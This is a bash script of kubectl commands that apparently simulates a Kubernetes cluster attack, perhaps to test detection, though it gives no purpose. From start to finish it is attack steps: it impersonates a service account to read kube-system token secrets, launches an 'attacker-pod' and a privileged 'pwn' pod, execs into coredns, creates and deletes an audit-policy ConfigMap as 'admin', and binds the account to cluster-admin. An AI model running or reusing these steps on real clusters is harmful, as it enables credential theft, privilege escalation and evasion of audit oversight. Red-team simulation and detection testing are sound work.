#!/usr/bin/env bash

kubectl create ns secure-ops
kubectl config set-context --current --namespace=secure-ops

kubectl create sa monitoring
kubectl run attacker-pod --image=alpine --command -- sleep 3600
kubectl auth can-i get secrets --as=system:serviceaccount:secure-ops:monitoring

secret_name="$(
  kubectl get secrets -n kube-system --no-headers \
    | awk '/default-token/ { print $1; found=1; exit } !found && NR == 1 { first=$1 } END { if (!found) print first }'
)"
kubectl get secret -n kube-system "${secret_name}" --as=system:serviceaccount:secure-ops:monitoring

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
  restartPolicy: Never
EOF

kubectl exec -n kube-system "$(kubectl get pods -n kube-system | grep coredns | awk '{print $1}' | head -n1)" -- cat /etc/resolv.conf

audit_policy_file="$(mktemp)"
cat > "${audit_policy_file}" <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: audit-policy
  namespace: kube-system
data:
  policy: old
EOF

kubectl apply -f "${audit_policy_file}"
kubectl delete -f "${audit_policy_file}" --as=admin
rm -f "${audit_policy_file}"

cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: escalate-binding
subjects:
- kind: ServiceAccount
  name: monitoring
  namespace: secure-ops
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF